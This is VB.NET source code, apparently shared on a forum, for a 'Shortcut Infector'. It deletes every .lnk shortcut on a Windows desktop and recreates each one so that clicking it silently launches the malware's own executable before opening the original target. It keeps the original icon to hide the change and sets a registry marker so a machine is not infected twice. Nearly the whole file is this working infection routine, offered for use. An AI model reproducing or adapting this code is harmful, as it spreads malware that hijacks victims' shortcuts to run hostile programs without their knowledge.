'********************************
'********** By ʍᴙ.ώoŁƒ **********
'-------                  -------
'---------- Dev-Point -----------
'-------                  -------
'****** Shortcut Infector *******

Public Sub ShortcutInfection()
        On Error Resume Next
        If RegValueGet("Mr.Wolf") = "True" Then
            Exit Sub
        Else
            RegValueSet("Mr.Wolf", "True")
        End If
        Dim DeskTop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\"
        Dim file = IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
        Dim virustarget = Application.ExecutablePath.ToString
        For Each mw In file
            Dim lnk = IO.Path.GetExtension(mw)
            Dim name = IO.Path.GetFileNameWithoutExtension(mw)
            Dim lnkPath = IO.Path.GetFullPath(mw)
            If lnk = ".lnk" Then
                Dim namelnk = System.IO.Path.GetFileName(lnkPath)
                Dim WSH = CreateObject("WScript.Shell")
                Dim ExeLink = WSH.CreateShortcut(lnkPath)
                With CreateObject("WScript.Shell").CreateShortcut(DeskTop & namelnk)
                    .TargetPath = "cmd.exe"
                    .WorkingDirectory = ""
                    .Arguments = "/c start " & virustarget & "&explorer /root,""" & ExeLink.TargetPath.ToString & """ & exit"
                    .IconLocation = ExeLink.TargetPath.ToString
                    IO.File.Delete(lnkPath)
                    .Save()
                End With
            End If
        Next
    End Sub
    Public comp As Object = New Microsoft.VisualBasic.Devices.Computer
    Function RegValueGet(ByVal name As String) As String
        Try
            Return comp.Registry.CurrentUser.CreateSubKey("Software\" & "ShortCutInfection").GetValue(name, "")
        Catch ex As Exception
            Return "error < Not Found >"
        End Try
    End Function
    Function RegValueSet(ByVal name As String, ByVal values As String)
        Try
            comp.Registry.CurrentUser.CreateSubKey("Software\" & "ShortCutInfection").SetValue(name, values)
        Catch ex As Exception
        End Try
        Return Nothing
    End Function